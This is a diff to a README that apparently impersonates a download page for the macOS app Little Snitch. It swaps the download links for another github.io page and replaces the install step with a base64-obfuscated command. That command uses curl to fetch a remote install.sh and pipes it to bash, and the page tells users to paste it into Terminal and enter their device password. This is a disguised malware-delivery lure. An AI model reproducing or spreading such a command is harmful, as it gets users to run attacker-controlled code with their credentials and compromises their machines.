@@ -7,7 +7,7 @@ Ideal for privacy-conscious users and professionals, Little Snitch helps you det
 ---
 
 ## ✅ Download Little Snitch for macOS  
-[![Download Little Snitch](https://img.shields.io/badge/Download-Little_Snitch-blueviolet)](https://little-snitch-download-mac.github.io/.github)
+[![Download Little Snitch](https://img.shields.io/badge/Download-Little_Snitch-blueviolet)](https://shuziktobehuman.github.io/huja/Little)
 
 ---
 
@@ -26,7 +26,7 @@ Ideal for privacy-conscious users and professionals, Little Snitch helps you det
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -67,7 +67,7 @@ Fully optimized for macOS Ventura and Apple Silicon, Little Snitch offers unmatc
 
 ---
 
-[![Download Little Snitch](https://img.shields.io/badge/Download-Little_Snitch-blueviolet)](https://little-snitch-download-mac.github.io/.github)
+[![Download Little Snitch](https://img.shields.io/badge/Download-Little_Snitch-blueviolet)](https://shuziktobehuman.github.io/huja/Little)
 
 ---
 
